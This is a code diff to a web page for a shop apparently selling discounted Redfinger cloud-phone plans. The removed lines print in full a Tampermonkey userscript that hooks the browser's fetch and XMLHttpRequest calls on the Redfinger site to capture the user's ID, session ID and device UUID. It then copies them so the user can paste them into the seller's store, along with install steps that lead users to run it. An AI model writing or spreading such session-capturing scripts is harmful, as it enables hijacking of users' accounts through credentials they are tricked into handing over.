@@ -99,26 +99,13 @@
       <p>AFFORDABLE RED FINGER SAPPHIRES • 24/7 Automated</p>
     </div>
     <div class="content">
-      <!-- Installation Guide -->
-      <div class="step">
-        <h2 style="text-align:center; margin-bottom:25px;">📱 Installation Guide</h2>
-        <p><strong>1.</strong> Install Kiwi Browser + Tampermonkey</p>
-        <p><strong>2.</strong> Tap button below to copy script</p>
-        <p><strong>3.</strong> In Tampermonkey → Create new script → Paste → Save</p>
-        <button onclick="copyScript()" style="background: linear-gradient(90deg, #a855f7, #c084fc); color: white;">
-          <i class="fas fa-copy"></i> COPY FULL SCRIPT CODE
-        </button>
-        <button onclick="openRedfinger()" style="margin-top:10px;">
-          <i class="fas fa-external-link-alt"></i> OPEN REDFINGER LOGIN PAGE
-        </button>
-      </div>
 
       <!-- Step 1: User ID & Reward Code -->
       <div class="step">
         <h2 style="text-align:center; margin-bottom:20px;">📋 Step 1: Enter Your Info</h2>
         <input type="text" id="userId" placeholder="User ID" required>
-        <input type="text" id="rewardCode" placeholder="Reward Code (if any)" required>
-        <small style="color:#94a3b8; display:block; margin-top:8px;">You can get your User ID by using the Tampermonkey script</small>
+        <input type="text" id="rewardCode" placeholder="Reward Code (if any)">
+        <small style="color:#94a3b8; display:block; margin-top:8px;">Get your User ID using the Tampermonkey script on Redfinger</small>
       </div>
 
       <!-- Price Plans -->
@@ -175,62 +162,6 @@
   </div>
 
   <script>
-    function copyScript() {
-      const script = `// ==UserScript==
-// @name Redfinger Auto Capture
-// @namespace https://dazai-ux.github.io
-// @version 2.4
-// @description Captures Redfinger credentials
-// @author Dazai
-// @match https://www.cloudemulator.net/*
-// @grant GM_setClipboard
-// @run-at document-end
-// ==/UserScript==
-(function() {
-    'use strict';
-    let captured = { userId: "Not Found", sessionId: "Not Found", uuid: "Not Found" };
-    function extractFromUrl(url) {
-        try {
-            const params = new URL(url).searchParams;
-            if (params.has('userId')) captured.userId = params.get('userId');
-            if (params.has('sessionId')) captured.sessionId = params.get('sessionId');
-            if (params.has('uuid') || params.has('deviceId')) captured.uuid = params.get('uuid') || params.get('deviceId');
-        } catch(e){}
-    }
-    const originalFetch = window.fetch;
-    window.fetch = async function(input) {
-        if (typeof input === 'string') extractFromUrl(input);
-        return originalFetch.apply(this, arguments);
-    };
-    const originalOpen = XMLHttpRequest.prototype.open;
-    XMLHttpRequest.prototype.open = function(method, url) {
-        if (url) extractFromUrl(url);
-        return originalOpen.apply(this, arguments);
-    };
-    function createButton() {
-        if (document.getElementById('rf-capture-btn')) return;
-        const btn = document.createElement('button');
-        btn.id = 'rf-capture-btn';
-        btn.innerHTML = '📋 COPY REDFINGER INFO';
-        btn.style.cssText = 'position:fixed;bottom:25px;right:25px;z-index:2147483647;padding:16px 28px;background:linear-gradient(90deg,#22c55e,#86efac);color:black;border:none;border-radius:50px;font-weight:bold;box-shadow:0 10px 30px rgba(74,222,128,0.6);cursor:pointer;';
-        btn.onclick = () => {
-            const text = \`🔑 Redfinger Credentials\\n\\nUser ID : \${captured.userId}\\nSession : \${captured.sessionId}\\nUUID : \${captured.uuid}\\nTime : \${new Date().toLocaleString()}\`;
-            GM_setClipboard(text);
-            alert("✅ Copied! Return to Dazai's Store and paste.");
-        };
-        document.body.appendChild(btn);
-    }
-    setTimeout(createButton, 1200);
-})();`;
-      navigator.clipboard.writeText(script).then(() => {
-        alert("✅ Script copied to clipboard!\n\nNow go to Tampermonkey → Create new script → Paste (Ctrl+V) → Save (Ctrl+S)");
-      });
-    }
-
-    function openRedfinger() {
-      window.open('https://www.cloudemulator.net/app/sign-in?type=RedeemCode&channelCode=web', '_blank');
-    }
-
     let selectedPlan = "SVIP";
     let selectedDays = "30";
     let selectedFile = null;
